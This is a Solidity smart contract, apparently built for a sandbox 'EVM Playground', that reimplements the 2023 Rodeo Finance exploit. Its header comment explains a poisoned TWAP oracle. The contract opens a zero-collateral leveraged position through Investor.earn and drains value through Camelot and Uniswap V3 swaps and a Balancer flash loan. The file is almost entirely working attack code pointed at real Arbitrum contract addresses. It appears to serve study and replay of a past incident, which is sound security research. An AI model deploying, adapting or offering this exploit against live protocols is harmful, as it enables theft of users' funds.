// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-RodeoFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`RodeoTest` is both the caller of `Investor.earn()` via `address(this)` AND
// the Balancer flash-loan callback target `receiveFlashLoan`), so there is no
// standalone attack contract to deploy. This is a faithful, self-contained copy
// of that inline attack (testExploit + receiveFlashLoan + swapTokens +
// swapUSDCToWETH + takeWETHFlashloanOnBalancer) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// evm-hack-registry/2023-07-RodeoFinance_exp/test/RodeoFinance_exp.sol.
//
// Root cause: Rodeo Finance's OracleTWAP prices unshETH-LP collateral off a
// 4-sample mean of a thin Camelot V2 pool, sampled every ~30-45 minutes. By the
// forked block the attacker had already poisoned all 4 samples via prior
// multi-block "sandwich" transactions (baked into the dumped fork state), so
// OracleTWAP.latestAnswer() reports ~4,219 ETH per unshETH (real value ~1 ETH).
// Investor.earn() lets the attacker open a leveraged position with ZERO own
// collateral (amt=0): the borrow's internal USDC->WETH->unshETH swap pumps the
// very same Camelot pool the poisoned oracle reads, and the resulting unshETH-LP
// health check in InvestorActor.life() passes because it values that LP at the
// inflated price. The attacker then dumps a pre-acquired unshETH stash into the
// freshly-pumped pool for a clean WETH profit, routing the rest through
// Uniswap V3 and a zero-fee Balancer flash loan.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IInvestor {
    function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes memory dat)
        external
        returns (uint256);
}

interface ICamelotRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        address referrer,
        uint256 deadline
    ) external;
}

interface ISwapRouter {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract RodeoDrain {
    IERC20 private constant unshETH = IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);
    IERC20 private constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 private constant USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    IInvestor private constant Investor = IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);
    ICamelotRouter private constant Router = ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);
    ISwapRouter private constant SwapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    address private constant usdcPool = 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;

    // Entrypoint. In the original test, the attacker pre-funds address(this)
    // (the test contract, playing the role of this contract) with
    // 47.294222088336002957 unshETH via `deal()` BEFORE calling this — the
    // playground config replicates that with a `setup.dealToken` step targeting
    // "exploit" before run() is recorded.
    function run() external {
        unshETH.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(SwapRouter), type(uint256).max);

        // Vulnerable call: forces a USDC -> WETH -> unshETH swap through the
        // Camelot pool the poisoned OracleTWAP reads, while borrowing with amt=0
        // (no own collateral) because the poisoned price makes the resulting
        // unshETH LP "worth" more than the 400,000 USDC borrowed.
        Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));

        // Swaps on CamelotRouter
        swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));
        swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));
        // Swap USDC to WETH on SwapRouter (UniswapV3 router)
        swapUSDCToWETH();
        takeWETHFlashloanOnBalancer();
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory, bytes memory) external {
        // Swap flashloaned WETH amount to USDC
        swapTokens(amounts[0], address(WETH), address(USDC));
        // Swap all of the USDC tokens to WETH
        swapUSDCToWETH();
        // Repay flashloan
        WETH.transfer(address(Vault), amounts[0]);
    }

    function swapTokens(uint256 amountIn, address fromToken, address toToken) private {
        address[] memory path = new address[](2);
        path[0] = fromToken;
        path[1] = toToken;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), address(0), block.timestamp + 100
        );
    }

    function swapUSDCToWETH() private {
        bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));
        ISwapRouter.ExactInputParams memory params =
            ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);
        SwapRouter.exactInput(params);
    }

    function takeWETHFlashloanOnBalancer() private {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 30e18;
        Vault.flashLoan(address(this), tokens, amounts, bytes(""));
    }
}
